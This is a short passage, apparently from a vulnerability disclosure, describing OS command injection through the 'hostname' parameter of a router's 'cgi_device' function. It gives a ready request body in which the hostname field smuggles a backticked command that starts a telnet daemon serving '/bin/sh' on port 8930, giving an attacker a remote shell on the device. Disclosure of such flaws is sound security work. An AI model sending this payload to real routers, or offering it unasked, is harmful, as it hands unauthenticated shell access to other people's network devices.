...
In `cgi_device` function, `hostname` is directly passed by the attacker, so we can control the `hostname` to attack the OS.
...
We set `hostname` as **`utelnetd -p 8930 -l /bin/sh`** , and the router will excute it,such as:
...
cmd=cgi_device&hostname=`utelnetd -p 8930 -l /bin/sh`&workgroup=&description=
```
